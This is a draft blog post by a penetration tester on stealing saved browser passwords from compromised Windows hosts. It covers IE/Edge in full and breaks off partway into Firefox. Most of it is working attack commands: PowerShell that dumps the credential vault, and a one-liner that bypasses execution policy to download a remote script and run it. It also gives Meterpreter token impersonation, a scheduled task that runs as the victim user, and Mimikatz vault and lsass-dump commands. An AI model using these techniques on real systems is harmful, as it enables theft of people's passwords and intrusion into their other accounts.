---
title: Extracting Saved Browser Passwords: Your New Favorite Post-Exploitation Technique
date: 06/24/2021
tags: ['cybersecurity', 'passwords', 'post-exploitation']
draft: true 
summary: Learn how to extract saved browser passwords from compromised hosts for fun and profit - your new favorite post-exploitation technique!
---

<div className='w-full flex flex-row items-center justify-center'>
![Chrome](/static/content/wifi-credentials/chrome-cracked.png)
</div>

## Overview 
People reuse passwords, and most people will never stop doing so, despite how frequently they are reminded not to. As every pentester knows, password reuse is commonplace, and we love few things more than finding caches of passwords!

My favorite place to find such caches is in browsers — most modern browsers will either save or offer to save your passwords for you, and some even save them by default! Lots of people take advantage of this convenient feature, which results in their passwords being stored on-disk in their browser’s application data files.

I have had great luck in the past with either using saved browser passwords to move laterally or to pivot into other applications and services. In this article, I’m going to go over the toolset and methodology I use for dumping saved passwords from browsers. Specifically, I’m going to cover:

* IE/Edge
* Firefox
* Chrome/Brave/Opera

## Stealing Passwords Saved in IE/Edge 
Note: I have not tested this on newer versions of Edge. Older versions use the credential vault (like IE), newer ones cloud save them to Microsoft servers if you’re logged into a Microsoft account. It’s still worth checking either way.

### Requirements 
To dump creds from IE and old versions of Edge, you need one of the following:

* a shell as the user you want to steal credentials from
* NT Authority\System permissions

### Dumping Creds with PowerShell
You can use the following PowerShell commands to list the saved login, password, and URLs that are stored in your user’s credential vault:

```powershell filename=credlist.ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password
```

Alternatively, you can drop the following one-liner:

```powershell 
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/HanseSecure/credgrap_ie_edge/master/credgrap_ie_edge.ps1')"
```

Props for this technique go to [@CyberWarship](https://x.com/cyberwarship)

### Dumping creds from an NT Authority/System Shell 
You have a couple of options for this attack if you’re running in a high-integrity shell. If you happen to be running Meterpreter, you can use the following commands to impersonate a user:

```shell
list tokens -u
impersonate_token <SOME_TOKEN>
shell
```

Other C2 frameworks may provide a similar feature. Then, you can use the PowerShell commands above like normal.

Alternatively, you can create a scheduled task that will execute as the desired user(s). First, create the following PowerShell script on the victim host in a place that the user you’re targeting will be able to read (`C:\users\public\documents` is always a good place). Note that this script is modified from the version provided above.

```powershell filename=credlistv2.ps1

[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() |% {$_.RetrievePasswords();$_} | Out-File C:\users\public\output.dmp
```

Then, execute the following command to schedule and run a task as the user to execute the PowerShell script created in the previous step:


```powershell filename=executescheduledtask.ps1 
powershell -ExecutionPolicy bypass "$action=New-ScheduledTaskAction -Execute 'C:\path\to\script.ps1';$trigger=New-ScheduledTaskTrigger -Once -At 'MM/DD/YYYY HH:MM:SS PM'; Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'Launch' -User 'DOMAIN\username'"
```

Make sure to modify the path to the script, the trigger time, the domain name, and the user name! Then, once the task has been executed, browse to where you wrote the file, and you can read all the user’s saved IE/Edge credentials.


**Alternatively**, you can use Mimikatz on the target host, or on a memory dump of lsass.exe:

```shell 
vault::cred
vault::list
```

or

```shell 
sekurlsa::minidump lsass.dmp # load the memory dump
vault::cred
vault::list
```

## Stealing passwords saved in firefox 
How it works: depending on the version, Firefox will store logins and passwords in the following files:

* Firefox < 32 (`key3.db`, `signons.sqlite`)
* Firefox >=32 (`key3.db`, `logins.json`)
* Firefox >=58.0.2 (`key4.db`, `logins.json`)
* Firefox >=75.0 (sha1 pbkdf2 sha256 aes256 cbc used by `key4.db`, `logins.json`)
* Applies to at least Thunderbird 68.7.0, likely other versions

Note the key file stores the encryption key that’s used to encrypt the values in the sqlite/json files. This attack actually can be performed offline, as long as we have the files that we need.

### Grabbing the key and login files
The default file path that these files are stored in is predictable, but it does contain a random string, so grabbing these files isn’t super easy to script out:

`%USERPROFILE%\appdata\roaming\mozilla\firefox\profiles\<RANDOMSTRING>.default`

Copy off all the files in this directory.


